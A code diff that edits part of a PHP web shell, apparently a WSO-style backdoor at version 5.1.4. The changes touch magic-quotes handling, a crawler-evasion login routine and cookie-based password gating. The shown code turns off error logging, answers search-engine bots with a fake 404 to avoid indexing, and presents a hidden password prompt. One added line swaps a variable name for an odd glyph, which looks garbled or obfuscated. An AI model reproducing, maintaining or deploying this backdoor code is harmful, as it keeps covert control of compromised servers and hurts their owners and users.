@@ -27,8 +27,9 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
-if (PHP_VERSION_ID < 70000)
-	@set_magic_quotes_runtime(0);
+if (function_exists("get_magic_quotes_runtime") && get_magic_quotes_runtime()) {
+	set_magic_quotes_runtime(false);
+}
 @define('VERSION', '5.1.4');
 if(  ( function_exists("get_magic_quotes_gpc") && get_magic_quotes_gpc() ) || ini_get('magic_quotes_sybase')  ){
 	function stripslashes_array($array) {
@@ -44,16 +45,15 @@ if(!empty($passwordbyme)) {
     if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $passwordbyme))
         hardLogin();
 }
-if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
-    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$_agent;
+if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘;
 function hardLogin() {
-		if(!empty($_SERVER['HTTP_USER_AGENT'])) {
-		  $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
-		  if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-		  header('HTTP/1.0 404 Not Found');
-		  exit;
-		  }
-		}
+    if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+        $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
+        if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+            header('HTTP/1.0 404 Not Found');
+            exit;
+        }
+    }
     die("<pre align=center><form method=post>Password<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>");
 }
 if(strtolower(substr(PHP_OS,0,3)) == "win")
